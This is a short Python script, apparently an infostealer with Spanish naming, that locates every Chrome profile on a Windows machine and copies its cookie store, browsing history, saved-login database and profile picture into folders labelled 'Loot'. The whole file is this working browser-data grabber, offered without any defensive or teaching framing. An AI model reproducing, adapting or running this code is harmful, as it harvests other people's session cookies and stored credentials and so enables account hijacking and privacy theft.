import os
import shutil
import re


profiles = []
def rutas_cookie():
    users_cookie_path = []
    templates = [r'Profile [0-9]', r'Default']
    cookies_path = os.getenv('TMP').replace('Temp', 'Google\\Chrome\\User Data')
    arch_chrome = os.listdir(cookies_path)
    
    for i in arch_chrome:
        for j in templates:
            if re.match(j, i):
                profiles.append(i)

    for i in profiles:
        i = cookies_path + (f'\\{i}')
        users_cookie_path.append(i)
    return users_cookie_path

def obtener_coockies(paths):
    loot_paths = []
    paths2  = []
    for i in paths:
        i = i + '\\Network'
        paths2.append(i)
    for i in profiles:
        loot_paths.append(f'Loot_de_{i}')
    try:
        for i in loot_paths:
            shutil.rmtree(i)
    except FileNotFoundError: pass
    for i in range(len(loot_paths)):
        shutil.copytree(paths2[i], f'{loot_paths[i]}\\coockies')

def profile_picture(paths):
    for i in range(len(profiles)):
        try:
            shutil.copyfile(f'{paths[i]}\\Google Profile Picture.png', f'Loot_de_{profiles[i]}\\Foto_perfil.png')
        except FileNotFoundError: pass
    
def history(paths):
    for i in range(len(paths)):
        try:
            shutil.copyfile(f'{paths[i]}\\History', f'Loot_de_{profiles[i]}\\Historial.db')
        except FileNotFoundError: pass

def login_data(paths):
    for i in range(len(paths)):
            try:
                shutil.copyfile(f'{paths[i]}\\Login Data', f'Loot_de_{profiles[i]}\\Datos_login.db')
            except FileNotFoundError: pass

if __name__ == '__main__':
    obtener_coockies(rutas_cookie())
    profile_picture(rutas_cookie())
    history(rutas_cookie())
    login_data(rutas_cookie())